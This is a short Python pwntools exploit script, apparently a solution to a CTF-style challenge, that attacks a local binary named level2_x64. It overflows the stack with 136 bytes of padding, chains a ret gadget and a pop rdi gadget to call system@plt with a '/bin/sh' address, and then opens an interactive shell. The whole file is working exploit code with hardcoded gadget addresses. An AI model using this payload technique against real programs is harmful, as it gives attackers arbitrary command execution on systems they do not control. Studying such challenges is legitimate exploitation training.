#Made by fly_autumn
#x64 ret2rop
from pwn import *
p = process("./level2_x64")
elf = ELF("./level2_x64")
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
context(os="linux",arch="amd64")

system_plt = 0x4004c0
bin_sh_addr = 0x600a90
pop_rdi = 0x4006b3
ret = 0x4004a1

offset = 136
payload = b'a' * offset + p64(ret) + p64(pop_rdi) + p64(bin_sh_addr) + p64(system_plt)
p.sendline(payload)

p.interactive()
